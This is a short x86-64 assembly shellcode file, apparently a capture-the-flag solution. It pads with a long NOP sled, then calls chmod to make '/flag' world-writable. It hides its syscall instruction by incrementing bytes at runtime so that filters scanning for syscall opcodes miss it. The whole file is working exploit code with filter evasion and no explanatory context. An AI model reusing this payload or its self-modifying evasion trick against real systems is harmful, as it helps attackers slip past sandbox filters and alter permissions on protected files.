.global _start
_start:
.intel_syntax noprefix
        .nops 4096
        mov rax, 90
        lea rdi, [rip+flag]
        mov rsi, 0777
        inc byte ptr [rip+evil+1]
        inc byte ptr [rip+evil]

evil:
.byte 0x0e
.byte 0x04

flag:
        .ascii "/flag"


